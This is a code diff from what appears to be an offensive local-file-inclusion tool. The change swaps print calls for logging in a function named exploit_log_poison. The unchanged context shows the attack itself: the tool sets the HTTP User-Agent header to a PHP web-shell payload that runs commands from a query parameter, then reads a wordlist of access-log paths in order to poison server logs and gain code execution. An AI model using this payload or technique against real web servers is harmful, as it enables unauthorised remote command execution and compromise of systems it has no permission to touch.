@@ -1,4 +1,4 @@
-from src.utils.arguments import args
+from src.utils.arguments import args, logging
 from src.httpreqs import request
 from src.configs import config
 from src.utils.args_check import scriptDirectory
@@ -11,13 +11,13 @@ def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayl
         return
 
     if(args.verbose):
-        print(colors.green("[.]")  + " Trying to locate http access log file...")
+        logging.info(colors.green("[.]")  + " Trying to locate http access log file...")
 
     maliciousHeaders = args.httpheaders.copy()
     maliciousHeaders['User-Agent'] = "<?php system($_GET['c']); ?>"
     
     if(not os.path.exists(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt")):
-        print(colors.red("[-]") + " Cannot locate '" + scriptDirectory + os.sep + "src/wordlists/http_access_log.txt" + "' file that contains log locations")
+        logging.info(colors.red("[-]") + " Cannot locate '" + scriptDirectory + os.sep + "src/wordlists/http_access_log.txt" + "' file that contains log locations")
         return
 
     with open(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt", "r") as f:
